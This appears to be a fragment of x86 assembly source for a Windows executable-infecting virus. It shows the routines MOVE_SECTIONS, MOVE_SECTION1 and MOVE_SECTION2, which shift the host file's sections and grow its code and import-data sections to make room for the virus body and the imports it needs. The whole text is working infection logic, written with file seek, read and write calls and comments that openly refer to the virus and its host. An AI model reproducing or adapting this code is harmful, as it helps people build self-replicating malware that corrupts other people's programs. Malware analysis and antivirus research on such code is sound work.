;This routine re-arranges the sections in the host to make room for the virus.
;There are two areas in the host that need to be expanded. First is the
;code section in the file. This must be expanded to make room for VIR_SIZE
;bytes of code. Secondly, the import data section must be expanded to make room
;for the imported data structures for the imports which the virus requires.
;This routine assumes that the imported data section comes after the
;code section. This is true in every file I have examined to date.

MOVE_SECTIONS:
        xor     ecx,ecx                 ;get sec # of last code section
        mov     cl,[ebp+CSECTION]
        dec     ecx
        call    GET_SEC_PTR             ;ebx points to section header
        mov     eax,[ebp+ebx+16]        ;get original raw data size for this section
        mov     [ebp+OLD_RAW],eax       ;and save it here
        lea     ebx,[edi+SEC_IDATA]
        call    FIND_SEC_HDR            ;find the .idata section
        or      ebx,ebx
        jnz     MS1                     ;.idata section found, go on
        ret                             ;exit if no reloc section found

MS1:    mov     eax,[ebp+ebx+16]        ;get original raw data size for .idata
        mov     [ebp+OLD_IDATA],eax     ;save it here
        add     eax,[ebp+ebx+12]        ;add virtual @ to get rva of end
        mov     [ebp+END_IDATA],eax
        call    GET_VMSIZE              ;must add this in too
        add     [ebp+END_IDATA],eax
        inc     ecx
        mov     eax,ecx                 ;put .idata section number in eax
        xor     ecx,ecx
        mov     cx,[ebp+esi+6]          ;get section count

MSL:    cmp     ecx,eax                 ;ecx=idata section?
        jz      MSL2                    ;yes, carry on

        dec     ecx                     ;decrement count
        push    ecx                     ;save next section number
        push    eax                     ;and last exec section number
        call    GET_SEC_PTR             ;ebx points to sec hdr of section ecx
        call    MOVE_SECTION1           ;go move it
        pop     eax                     ;restore last exec section number
        pop     ecx                     ;restore next section number
        jmp     MSL                     ;and continue with move till done

MSL2:   cmp     cl,[ebp+CSECTION]       ;last code section?
        jnz     MS2                     ;no, go move
        ret

MS2:    dec     ecx                     ;decrement count
        push    ecx                     ;save next section number
        push    eax                     ;and last exec section number
        call    GET_SEC_PTR             ;ebx points to sec hdr of section ecx
        call    MOVE_SECTION2           ;go move it
        pop     eax                     ;restore last exec section number
        pop     ecx                     ;restore next section number
        jmp     MSL2                    ;and continue with move till done


;This subroutine moves one section whose section header is pointed to by
;ebp+ebx. This call handles the situation where a section is after the
;idata section and must be moved to accomodate both the code and the idata
;size increase.
MOVE_SECTION1:
        mov     eax,VIR_SIZE            ;determine memory required by virus code
        call    GET_VMSIZE              ;result in eax
        add     [ebp+ebx+12],eax        ;add it to the virtual address
        mov     eax,IDATA_SIZE          ;determine idata requirements
        call    GET_IMSIZE              ;result in eax
        add     [ebp+ebx+12],eax        ;add it to the virtual address too
        mov     eax,VIR_SIZE
        call    GET_FSIZE               ;determine size of virus in file
        push    eax
        mov     eax,IDATA_SIZE
        call    GET_FSIZE               ;determine size of idata in file
        pop     ecx
        add     eax,ecx                 ;eax = total file size needed
        jmp     MOVE_SECTION

;This call handles the case of a section that is after the code, but not
;after the idata (it may be the idata itself). In this case, room need only
;be made to handle the code.
MOVE_SECTION2:
        mov     eax,VIR_SIZE            ;determine memory required by virus code
        call    GET_VMSIZE              ;result in eax
        add     [ebp+ebx+12],eax        ;add it to the virtual address
        mov     eax,VIR_SIZE
        call    GET_FSIZE               ;determine size of virus in file

MOVE_SECTION:
        mov     ecx,[ebp+ebx+20]        ;get PointerToRawData
        or      ecx,ecx
        jz      MSNX                    ;if it's zero, this is uninit data, doesn't take up space
        add     [ebp+ebx+20],eax        ;add virus file size to PointerToRawData
        add     eax,ecx                 ;eax=new PointerToRawData
        mov     edx,[ebp+ebx+16]        ;edx=SizeOfRawData

;Now move edx bytes from offset ecx to offset eax in the file, starting at
;the end, using 4*FB_SIZE chunks at the largest (=Size of FILEBUF).
MSNL:   mov     ebx,4*FB_SIZE
        cmp     edx,ebx                 ;edx<FB_SIZE
        jnc     MSN1
        mov     ebx,edx
MSN1:   sub     edx,ebx
        push    edx                     ;save registers
        push    eax
        push    ecx

        add     eax,edx                 ;eax=destination on move
        add     ecx,edx                 ;ecx=source on move, ebx=bytes to move
        xchg    eax,ecx
        push    ecx                     ;save destination a bit
        push    ebx                     ;save number of bytes to move
        call    FILE_SEEK               ;seek to source
        pop     ecx
        push    ecx                     ;ecx=bytes to read
        lea     edx,[ebp+FILEBUF]       ;edx=buffer @
        call    FILE_READ
        pop     ecx
        pop     eax                     ;get destination
        push    ecx
        call    FILE_SEEK               ;seek to destination
        pop     ecx
        lea     edx,[ebp+FILEBUF]       ;edx=buffer @
        call    FILE_WRITE              ;write to file

        pop     ecx                     ;restore registers
        pop     eax
        pop     edx
        or      edx,edx                 ;any bytes left to move?
        jnz     MSNL                    ;loop until done
MSNX:   ret

